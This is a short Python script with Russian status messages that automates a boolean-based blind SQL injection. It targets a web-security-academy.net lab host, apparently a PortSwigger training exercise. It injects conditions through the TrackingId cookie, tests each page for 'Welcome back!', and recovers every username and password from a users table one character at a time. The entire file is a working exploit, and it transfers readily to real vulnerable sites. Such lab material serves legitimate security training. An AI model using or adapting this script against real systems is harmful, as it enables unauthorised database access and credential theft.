import requests
import string

URL = "https://0ab600700371921c82c1f6320092000d.web-security-academy.net/"

def check_condition(payload_condition):
    payload = f"x' OR ({payload_condition})--"
    cookies = {'TrackingId': payload}
    response = requests.get(URL, cookies=cookies)
    return "Welcome back!" in response.text

def extract_string(sql_query):
    result = ""
    for position in range(1, 51):
        print(f"  [.] Проверяем позицию {position}...", end="\r")
        found_char = False
        alphabet = string.ascii_lowercase + string.digits + ":_"
        
        for char in alphabet:
            condition = f"SUBSTRING(({sql_query}), {position}, 1) = '{char}'"
            if check_condition(condition):
                result += char
                found_char = True
                break
                
        if not found_char:
            break
    return result

def main():
    print("[*] Начинаем дамп базы данных...")
    offset = 0
    
    while True:
        print(f"[*] Выкачиваем пользователя {offset + 1}...")
        
        query = f"SELECT username || ':' || password FROM users LIMIT 1 OFFSET {offset}"
        row_data = extract_string(query)

        if not row_data:
            print("\n[+] Больше строк нет. Дамп завершен.")
            break

        print(f"[+] Найдено: {row_data}")
        offset += 1

if __name__ == "__main__":
    main()